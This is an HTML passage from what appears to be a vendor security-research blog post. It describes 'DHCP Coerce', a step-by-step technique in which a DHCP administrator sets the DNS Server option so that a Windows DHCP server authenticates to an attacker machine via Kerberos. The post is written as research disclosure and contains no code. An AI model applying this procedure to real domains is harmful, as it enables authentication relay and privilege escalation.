  <div data-cmp-lazy data-title="Normally, DHCP options are used to serve data to requesting clients. Interestingly, the DNS Server option serves another purpose — its value will be used as the destination of DHCP DNS Dynamic Updates (Figure 5)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-c578840066&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:08:55Z&#34;,&#34;dc:title&#34;:&#34;Normally, DHCP options are used to serve data to requesting clients. Interestingly, the DNS Server option serves another purpose — its value will be used as the destination of DHCP DNS Dynamic Updates (Figure 5).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;6606f0e3-a033-48b4-8b44-893c0e0f4c64&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:25:31Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig5.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig5.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Normally, DHCP options are used to serve data to requesting clients. Interestingly, the DNS Server option serves another purpose — its value will be used as the destination of DHCP DNS Dynamic Updates (Figure 5)."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 5: DNS Server option effect on the DHCP DNS dynamic update process</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-255a1c71f9&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:34:09Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Why is this interesting? Microsoft DNS server and Windows DNS clients support a feature of Dynamic Updates called &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/spoofing-dns-by-abusing-dhcp.html#:~:text=One%20of%20the,over%20DNS.\&#34; target=\&#34;_self\&#34;>secure dynamic updates&lt;/a>. With this feature enabled (and it is, by default), DNS clients are required to authenticate before performing DNS updates on the server. This authentication is performed by using Kerberos over DNS.&lt;/p>\r\n&lt;p>With a DHCP administrator account, we can control the DNS Server option on the DHCP server and make it authenticate to an address of our choice. The steps in Figure 6 show how this is achieved.&lt;/p>\r\n&#34;}}">
    <p>Why is this interesting? Microsoft DNS server and Windows DNS clients support a feature of Dynamic Updates called <a href="/blog/security-research/spoofing-dns-by-abusing-dhcp#:~:text=One%2520of%2520the,over%2520DNS." target="_self">secure dynamic updates</a>. With this feature enabled (and it is, by default), DNS clients are required to authenticate before performing DNS updates on the server. This authentication is performed by using Kerberos over DNS.</p>
<p>With a DHCP administrator account, we can control the DNS Server option on the DHCP server and make it authenticate to an address of our choice. The steps in Figure 6 show how this is achieved.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="The steps in Figure 6 show how this is achieved. " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-ca35b5c5d6&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:04Z&#34;,&#34;dc:title&#34;:&#34;The steps in Figure 6 show how this is achieved.&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;2ff61f6c-a09d-419d-8cec-e0480217a1bf&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:33:28Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig6.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig6.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="The steps in Figure 6 show how this is achieved. "/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 6: DHCP lease causing the server to authenticate to the client via Kerberos</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-aeb76fc8d4&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:09:46Z&#34;,&#34;xdm:text&#34;:&#34;&lt;ol>\r\n&lt;li>&lt;p>On the target DHCP server, we configure our IP address (172.25.14.19) as the DNS Server option.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>From our machine, we lease an IP address while specifying the &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/spoofing-dns-by-abusing-dhcp.html#:~:text=For%20our%20cause,FQDN%20(Figure%209).\&#34; target=\&#34;_self\&#34;>FQDN option&lt;/a>. In this example, we specify the FQDN “&lt;i>aaa.aka.test&lt;/i>”. This triggers a DHCP DNS Dynamic Update.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>The DHCP server sends a DNS “Start of Authority” (SOA) query to our machine (thinking it’s the DNS server). This query is used by the DHCP server to check which DNS server is authoritative over “&lt;i>aaa.aka.test&lt;/i>”.&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>We respond to the SOA query, specifying our machine as the authoritative DNS server for the record “&lt;i>aaa.aka.test”&lt;/i>.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>The DHCP server attempts to create the record by sending a DNS Dynamic Update to our machine. This update attempt is unauthenticated.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>We refuse the unauthenticated update to trigger an authentication attempt by the server.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>The DHCP server authenticates to our machine using Kerberos authentication over DNS, implemented by sending a TKEY query.&lt;/p>\r\n&lt;/li>\r\n&lt;/ol>\r\n&#34;}}">
    <ol>
<li><p>On the target DHCP server, we configure our IP address (172.25.14.19) as the DNS Server option.</p>
</li>
<li><p>From our machine, we lease an IP address while specifying the <a href="/blog/security-research/spoofing-dns-by-abusing-dhcp#:~:text=For%2520our%2520cause,FQDN%2520(Figure%25209)." target="_self">FQDN option</a>. In this example, we specify the FQDN “<i>aaa.aka.test</i>”. This triggers a DHCP DNS Dynamic Update.</p>
</li>
<li><p>The DHCP server sends a DNS “Start of Authority” (SOA) query to our machine (thinking it’s the DNS server). This query is used by the DHCP server to check which DNS server is authoritative over “<i>aaa.aka.test</i>”. </p>
</li>
<li><p>We respond to the SOA query, specifying our machine as the authoritative DNS server for the record “<i>aaa.aka.test”</i>.</p>
</li>
<li><p>The DHCP server attempts to create the record by sending a DNS Dynamic Update to our machine. This update attempt is unauthenticated.</p>
</li>
<li><p>We refuse the unauthenticated update to trigger an authentication attempt by the server.</p>
</li>
<li><p>The DHCP server authenticates to our machine using Kerberos authentication over DNS, implemented by sending a TKEY query.</p>
</li>
</ol>

</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-11ade2ad73&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:37:17Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>&amp;nbsp;Figure 7 shows an example capture of this technique in action.&lt;/p>\r\n&#34;}}">
    <p> Figure 7 shows an example capture of this technique in action.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title=" Figure 7 shows an example capture of this technique in action." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-09fb4f4c68&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:10Z&#34;,&#34;dc:title&#34;:&#34;Figure 7 shows an example capture of this technique in action.&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;5b90ebe5-8f9f-4eb1-87db-741dbd8c564d&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:39:12Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig7.png&#34;}}}">
    
      
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig7.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt=" Figure 7 shows an example capture of this technique in action."/>
        
        
      
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 7: Packet capture of the DHCP lease and subsequent DNS traffic</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-c500c48eee&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:41:41Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>&lt;b>This technique, which we’ve dubbed &lt;i>DHCP Coerce&lt;/i>, grants us a Kerberos authentication coercion primitive, as we can make any DHCP server authenticate to our machine.&lt;/b>&lt;/p>\r\n&#34;}}">
    <p><b>This technique, which we’ve dubbed <i>DHCP Coerce</i>, grants us a Kerberos authentication coercion primitive, as we can make any DHCP server authenticate to our machine.</b></p>

</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-731cea4fa0&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:43:43Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Have questions about DHCP security?&lt;/p>\r\n&#34;}}">
    <p>Have questions about DHCP security?</p>

</div>

    

</div>
<div class="button button__large-button button__cta-blue button__dark-hover button__fullWidth-mobile aem-GridColumn aem-GridColumn--default--12">

    <span class="cmp-button__text">Email us</span>
